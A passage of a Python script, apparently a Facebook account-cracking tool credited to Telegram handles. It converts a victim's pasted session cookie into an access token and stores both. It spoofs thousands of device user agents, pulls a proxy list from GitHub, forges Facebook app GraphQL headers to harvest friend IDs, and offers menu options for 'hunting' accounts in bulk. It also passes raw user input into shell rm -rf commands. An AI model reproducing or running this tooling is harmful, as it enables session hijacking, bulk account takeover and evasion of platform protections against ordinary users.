import re,random,uuid,subprocess
from os import system
import base64
import urllib3,rich
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from bs4 import BeautifulSoup as sop
import requests,bs4,json,sys,random,datetime,time
import time,json,string
try:
	import mechanize
	br=mechanize.Browser()
	br.set_handle_robots(False)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
except:
	os.system('pip install mechanize')
try:
	from bs4 import BeautifulSoup as bs,os
except:
	os.system('pip install bs4')
q='968'
qq='8280'
qqq='52729'
qqqq='420'
client_id=f"{qqqq}038{q}89{qq}485649{qqq}208"
BR='\x1b[38;5;208m'
AH2='\x1b[38;5;204m' 
AS2='\x1b[38;5;220m'
MJ='\x1b[38;5;193m'
MJ2='\x1b[38;5;216m'
MJ3='\x1b[38;5;190m'
MJ4='\x1b[38;5;106m'
ma='\x1b[38;5;26m'
Z='\x1b[1;36m' #احمر
R='\x1b[1;35m' #احمر
X='\x1b[1;34m' #اصفر
F='\x1b[2;33m' #اخضر
C='\x1b[1;32m' #ابيض
Y='\x1b[1;30m' #ازرق فاتح.
E='\x1b[1;36m'
B='\x1b[2;35m'
G='\x1b[1;33m'
S='\x1b[1;32m'
GG='\x1b[2;32m' #اخضر
W='\x1b[1;97m' #ابيض
Z1='\x1b[1;31m' #احمر
P='\x1b[2;35m' #وردي

try:
	import requests
except ImportError:
	Z='\x1b[1;36m' #احمر
R='\x1b[1;35m' #احمر
X='\x1b[1;34m' #اصفر
F='\x1b[2;33m' #اخضر
C='\x1b[1;32m' #ابيض
Y='\x1b[1;30m' #ازرق فاتح.
E='\x1b[1;36m'
B='\x1b[2;35m'
G='\x1b[1;33m'
S='\x1b[1;32m'
GG='\x1b[2;32m' #اخضر
W='\x1b[1;97m' #ابيض
Z1='\x1b[1;31m' #احمر
P='\x1b[2;35m' #وردي
try:
 from cfonts import render,say
except:
    os.system('pip install python-cfonts')
output=render('WDEH',colors=['red','white'],align='center')
print(output)
print(GG+'-'*1+W+'{ '*1+GG+'@WDEH_ALROSE'*1+W+' }'*1+GG+'-'*1+W+'{'*1+Z1+' 𝐖𝐃𝐄𝐇׀𝐁𝐘𓅓'*1+W+' }'*1+'-'*1+GG+W+'{'*1+GG+'@YRWSYY'*1+W+'}'*1)
print('')
token=input(GG+'T'*1+W+'O'*1+P+'K'*1+B+'E'*1+X+'N '*1+GG+'➯'*1+B)
print('')
ID=input(' ID'+B+'➯'+X)
pretty.install()
CON=sol()
ua=['Mozilla/5.0 (Linux; U; Android 11; pt-ao; TECNO PR651E Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 PHX/13.3',]
ua=['Mozilla/5.0 (Linux; U; Android 11; pt-ao; TECNO PR651E Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 PHX/13.3',]
ua=['Mozilla/5.0 (Linux; U; Android 11; pt-ao; TECNO PR651E Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 PHX/13.3',]
ua=['Mozilla/5.0 (Linux; U; Android 11; pt-ao; TECNO PR651E Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 PHX/13.3',]
ua=['Mozilla/5.0 (Linux; U; Android 11; pt-ao; TECNO PR651E Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 PHX/13.3',]
ua=['Mozilla/5.0 (Linux; U; Android 11; pt-ao; TECNO PR651E Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 PHX/13.3',]
ua=['Mozilla/5.0 (Linux; U; Android 11; pt-ao; TECNO PR651E Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 PHX/13.3',]
ua=['Mozilla/5.0 (Linux; U; Android 11; pt-ao; TECNO PR651E Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 PHX/13.3',]
ua=['Mozilla/5.0 (Linux; U; Android 11; pt-ao; TECNO PR651E Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 PHX/13.3',]
ua=['Mozilla/5.0 (Linux; U; Android 11; pt-ao; TECNO PR651E Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 PHX/13.3',]
ugen=['NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Opera/9.80 (Android; Opera Mini/7.5.33361/191.273; U; pt) Presto/2.12.423 Version/12.16 UNTRUSTED/1.0']
ua=['Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36',]
ua=['Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36',]
ua=['Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36',]
ua=['Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36',]
ua=['Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Safari/537.36',]
ua=['Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36',]
ua=['Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52',]
ua=['Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36',]
ua=['Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36',]
ua=['Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox=requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1,9)
	c=random.randrange(1,9)
	d='Nokia'
	e=random.randrange(100,9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1,9)
	h=random.randrange(1,4)
	i=random.randrange(1,4)
	j=random.randrange(1,4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
	e=random.randrange(1,999)
	f=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100,9999)
	c=random.randrange(100,9999)
	d=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
	e=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
	f=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
	g=random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])
	h=random.randrange(1,9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1,9)
	k=random.randrange(1,9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Saw4x/TOOLxFB/blob/main/.SAW-MOBILE.txt').text
		ua=open('.SAW-MOBILE.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.SAW-MOBILE.txt','r').read().splitlines()
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni=[],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
P='\x1b[1;97m'
M='\x1b[1;91m'
H='\x1b[1;92m'
K='\x1b[1;93m'
B='\x1b[1;94m'
U='\x1b[1;95m' 
x='\x1b[m' # DEFAULT
m='\x1b[1;91m' #RED+
k='\x1b[93m' # KUNING+
h='\x1b[1;92m' # HIJAU+
hh='\x1b[32m' # HIJAU-
u='\x1b[95m' # UNGU
kk='\x1b[33m' # KUNING-
b='\x1b[1;96m' # BIRU-
B='\x1b[0;34m' # BIRU+
Z='\x1b[1;31m' 
X='\x1b[1;33m' 
F='\x1b[2;32m' 
C='\x1b[1;97m' 
GJ='\x1b[2;36m'
Y='\x1b[1;34m' 
E='\x1b[1;31m'
AB_A='\x1b[1;97m' # ابيض خط عربض
RS='\x1b[30m' #رصاصي
AH_F='\x1b[31m'   #احمر فاتح
AKH_F='\x1b[32m' #اخضر فاتح
AS_T='\x1b[33m'#اصفر طوخ
SM='\x1b[34m'  #سمائي
BN='\x1b[35m'#بنفسجي
AZ_T='\x1b[36m'  #ازرك طوخ
AB_KH='\x1b[37m' #ابيض خط خفيف
AH_T='\x1b[91m'  #احمر طوخ
AKH_T='\x1b[92m'#اخضر طوخ
AS_F='\x1b[93m'    #اصفر فاتح
WR='\x1b[95m'      #وردي
p='\x1b[38;5;208m' #برتقالي
AH2='\x1b[38;5;204m' 
AS2='\x1b[38;5;220m'
MJ='\x1b[38;5;193m'
MJ2='\x1b[38;5;216m'
MJ3='\x1b[38;5;190m'
O='\x1b[0;96m'     # Biru Muda
P='\x1b[38;5;231m' # Putih
J='\x1b[38;5;208m' # Jingga
MJ4='\x1b[38;5;106m'
asu=random.choice([m,O,h,u,b,MJ3,MJ2,MJ,AS2,AH2,B,WR,AS_F,AKH_T,AH_T,AB_KH,AZ_T,BN,SM,AS_T,AKH_F,AH_F,RS,AB_A,Z,p,b,kk,hh,x,Y,P,u,B,J,MJ4,p])
dic={'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2={'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl=datetime.datetime.now().day
bln=dic[(str(datetime.datetime.now().month))]
thn=datetime.datetime.now().year
okc='LIVE-'+str(bln)+'/'+str(thn)+'.txt'
cpc='CP-'+str(bln)+'/'+str(thn)+'.txt'
def banner():
	from cfonts import render
	from random import choice
	output=render('WDEH',colors=[str(choice(['white'])),str(choice(['yellow'])),str(choice(['white','yellow','yellow']))],align='left',space='0')
	print(output)
	print(f'''{asu}   
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘
⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀
⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸
⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇
⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀
⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀
⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀                           
{B}┏{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}┓
{Z}┃ {C}⌯ {X}TG-Tele : @YRWSYY {Z} ┃
{B}┃{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}┃
{Z}┃ {C}⌯ {X}Me-Tele : @WDEH_ALROSE {Z} ┃ 
{B}┃{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}┃
{Z}┃ {C}⌯ {X}Me-instagram : _p1__ {Z}┃
{B}┗{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}┛                                                       
''')
os.system('clear')
sim_hini=str(random.randint(2e4,4e4))
trace_id=str(uuid.uuid4())
ses=requests.Session()
try:
	android=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','').upper()
	model=subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','').upper()
	carrier=''+subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','').upper()
except:
	android=random.choice(['TECNO','INFINIX','SAMSUNG'])
	model=random.choice(['LD2','SM-J009','SM-J505','HOT12','NOTE-11','A5-PRO'])
	carrier=''+random.choice(['02','Oramge','EE','At&amp','MTN','Cricket'])
class login():
	def __init__(self):
		ids=[]
	def login_epa(self):
		system('clear');
		banner()
		print(f''''\033[1;34m                                          
              \033[1;34m⌌\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;34m⌍          
              ▏\033[33mPROGRAM \033[2;35m   : \033[2;32mWdeH \033[1;34m▕             
              ▏\033[33mChannel    \033[2;35m: \033[2;32m@YRWSYY \033[1;34m▕              
              ▏\033[33mTele       \033[2;35m: \033[2;32m@WDEH_ALROSE\033[1;34m▕
              ▏\033[33mTools      \033[2;35m: \033[2;32mWdeH AlROSE\033[1;34m ▕            
              ⌎\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;34m⌏''')
		print(50*'-')
		cok=input('[+] masukan cookie : ')
		cos={'cookie':cok}; data={'access_token':'1348564698517390|007c0a9101b9e1c8ffab727666805038','scope':''}; req=ses.post('https://graph.facebook.com/v16.0/device/login/',data=data).json(); cd=req['code']; ucd=req['user_code']; url='https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd); req=sop(ses.get('https://mbasic.facebook.com/device',cookies=cos).content,'html.parser'); raq=req.find('form',{'method':'post'}); dat={'jazoest':re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1),'fb_dtsg':re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1),'qr':'0','user_code':ucd}; rel='https://mbasic.facebook.com'+raq['action']; pos=sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser')
		dat={}
		raq=pos.find('form',{'method':'post'})
		for x in raq('input',{'value':True}):
			try:
				if x['name']=='__CANCEL__':
					pass
				else:
					dat.update({x['name']:x['value']})
			except Exception as e:
				pass
		rel='https://mbasic.facebook.com'+raq['action']; pos=sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser'); req=ses.get(url,cookies=cos).json(); tok=req['access_token']; kot=open('.token.txt','w').write(tok); koc=open('.cok.txt','w').write(cok); masuk=input('\n[✔️] كوكيز شغال اخرج وارجع شغله'); os.system('clear');main_menu()
def perfector(save_as):
	try:
		for type_id in siid:
			os.system('cat '+save_as+' | grep "'+type_id+'" >> /sdcard/007.txt')
		os.system('sort -r /sdcard/007.txt | uniq > '+save_as+'')
		os.system('rm -rf /sdcard/007.txt')
	except:pass
def main_menu():
	os.system('clear');banner()
	ip=requests.get('https://api.ipify.org').text
	print(55*'━')
	print((k+'['+p+'•'+k+']'+p+' Your IP : '+ip))
	print(55*'━')
	print('\n')
	print(55*'━')
	print((k+'['+p+'1'+k+']'+p+' Login cookies | تـسـجـيـل الـكـوكـيـز'))
	print((k+'['+p+'2'+k+']'+p+' Fishing through the hands of friends | صـيـد مـن اصـدقـاء بـأكـثـر مـن ايـدي'))
	print((k+'['+p+'3'+k+']'+p+' Hunting of followers | صـيـد مـن الـمـتـابـعـيـن'))
	print((k+'['+p+'4'+k+']'+p+'Catch from file | صـيـد مـن مـلـف'))
	print((k+'['+p+'5'+k+']'+p+'Dragging an ID file from a specific IDS | سـحـب مـلـف ايـديـات مـن ايـديـات مـعـيـنـه'))
	print((k+'['+p+'6'+k+']'+p+'Extracting IDS from the IDS file | سـحـب ايـديـات مـن مـلـف ايـديـات'))
	print((k+'['+p+'7'+k+']'+p+'Ids file arrangement | تـرتـيـب مـلـف ايـديـات'))
	print((k+'['+p+'0'+k+']'+p+' Login out | تـسـجـيـل خـروج'))
	print(55*'━')
	menu=input('\x1b[1;32m Choose Option  ')
	if menu in['01','1']:
		login().login_epa();main_menu()
	if menu in['02','2']:
		dump_massal()
	if menu in['03','3']:
		print('')
	if menu in['04','4']:
		crack_file()
	if menu in['05','5']:
		file_create_menu().new_ids()
	if menu in['06','6']:
		file_create_menu().file_by_file()
	if menu in['07','7']:
		sort()
	if menu in['00','0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		exit('Thanks For Using... !')
	else:
		exit(' invalid ')
siid=[]
sep=[]
class file_create_menu():
	def __init__(self):
		try:
			os.system('rm -rf .a.txt')
			os.system('rm -rf .temp.txt')
			os.remove('.temp.txt')
			os.remove('.a.txt')
		except:
			pass
		self.ids=[]
		self.total=[]
		self.loop=0
		try:
			self.token=open('.token.txt','r').read()
			uid='100061689760374'
			try:
				headers={'X-Graphql-Client-Library':'graphservice','X-Graphql-Request-Purpose':'fetch',
				     'X-Fb-Privacy-Context':'2368177546817046','X-Fb-Background-State':'1',
				     'X-Fb-Net-Hni':'41001','X-Fb-Sim-Hni':'41001',
				     'Authorization':'OAuth '+self.token+'',
				     'X-Fb-Session-Id':'nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9',
				     'X-Fb-Connection-Type':'WIFI','X-Fb-Device-Group':'4481','X-Tigon-Is-Retry':'False',
				     'X-Fb-Rmd':'cached=0;state=URL_ELIGIBLE','X-Fb-Ta-Logging-Ids':f"graphql:{trace_id}",
				     'X-Fb-Friendly-Name':'SuggestionsFriendListContentQuery',
				     'X-Fb-Request-Analytics-Tags':'graphservice','Priority':'u=0',
				     'Accept-Encoding':'gzip, deflate','X-Fb-Http-Engine':'Liger','X-Fb-Client-Ip':'True',
				     'X-Fb-Server-Cluster':'True','X-Fb-Connection-Token':'ef0e330bff1cd312f36aa5f2c69c59a9',
				     'Content-Type':'application/x-www-form-urlencoded','Content-Length':'567'}
				data={
				 'User-Agent':'[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/'+carrier+';FBMF/'+android+' MOBILE LIMITED;FBBD/'+android+';FBPN/com.facebook.katana;FBDV/'+model+';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
				 'client_doc_id':client_id,
				 'method':'post',
				 'locale':'en_US',
				 'pretty':'false',
				 'format':'json',
				 'variables':'{"profile_id":'+uid+',"suggestion_friends_paginating_first":2500}',
				 'fb_api_req_friendly_name':'SuggestionsFriendListContentQuery',
				 'fb_api_caller_class':'graphservice',
				 'fb_api_analytics_tags':'["At_Connection","GraphServices"]',
				 'client_trace_id':trace_id,
				 'server_timestamps':'true',
				 'purpose':'fetch'
				}
				posted=requests.post('https://graph.facebook.com/graphql',headers=headers,data=data).json()
				if not posted['data']['user']['friends']['edges']:
				    os.system('clear');banner()
				    os.system('rm -rf .token.txt')
				    exit(' \n \x1b[1;31mYou have used this id many times try with another id & dont login this id for few days.\n\n \x1b[0m')
				try:
					data=posted['data']['user']['friends']['edges']
				except:
					print(f' \033[1;31m Sorry something wen wrong with this id. Login With Another ID\033[0m ')
					os.system('rm -rf .token.txt')
					exit()
			except Exception as e:
				os.system('clear');banner()
				print('\x1b[1;31m YOUR COOKIE HAS BEEN EXPIRED LOGIN WITH ANOTHER COOKIE\x1b[0m !')
				print(e)
				time.sleep(3)
				login().login_epa()
		except Exception as e:
			print(e)
			login().login_epa()
	def new_ids(self):
		os.system('clear');banner()
		save_as=input('Save file as : ')
		if not save_as=='/sdcard/':
			os.system(f'rm -rf {save_as}')
			open(save_as,'w')
		os.system('clear');
		banner()
		sepr=input(' DO YOU WANNA SEPERATE IDZ...? (y/n) : ')
		if sepr in['y','Y']:
			sep.append('y')
			print('\n\x1b[1;92m Example: 100087,100088 etc\x1b[0;97m')
			try:
				sl=int(input('\n How Many Links To crack : '))
			except:
				sl=1
			for el in range(sl):
				sid=input(f' Put {el + 1} link: ')
				siid.append(sid)
		elif sepr in['n','N']:
			sep.append('n')
		else:
			sep.append('n')
		try:
			file=open('.temp.txt','r').read().splitlines()
		except:
			file=[]
		print('        Paste All Ids Here ')
		while True:
			ids_all=input('')
			if ids_all=='':
				exit('SUCCESSFULLY DONE')
				break
			try:
				uid=ids_all.split('|')[0]
			except:
				uid=ids_all
